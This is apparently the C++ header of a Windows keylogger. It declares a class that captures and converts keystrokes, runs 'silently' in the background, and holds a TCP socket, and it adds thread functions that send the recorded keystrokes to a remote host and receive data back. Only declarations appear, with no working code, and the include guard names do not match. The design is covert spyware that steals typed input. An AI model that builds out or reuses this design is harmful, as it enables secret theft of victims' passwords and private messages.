#ifndef KEYLOGG_H
#define KEYLOG_H

#include "master.h"

using namespace std;


class Keylogger
{
    public:

        Keylogger();
        //-----------------------------------------------
        VOID setup();
        //-----------------------------------------------
        wstring specialKey(INT &keystroke);
        wstring intToUnicode(INT keystroke);
        //-----------------------------------------------
        VOID directTcp(); //starts a thread of the directTCp method and returns are HANDLE
        //-----------------------------------------------        //-----------------------------------------------
        VOID silentBackground();
        //-----------------------------------------------
        SOCKET getSocket();
        //-----------------------------------------------
        VOID setSocket(SOCKET &sock);
        //-----------------------------------------------
        ~Keylogger();
        
    private:
        SOCKET a_sock;

        CONST WCHAR a_name_file[8] = L"log.txt";
        HWND a_WindowHandle;
        DWORD a_dwThreadId;
        HKL a_hkl;
     
};

DWORD WINAPI sendKeystrokeThread(LPVOID param);
DWORD WINAPI recvDataThread(LPVOID param);
//DWORD WINAPI directTcp(LPVOID param)

#endif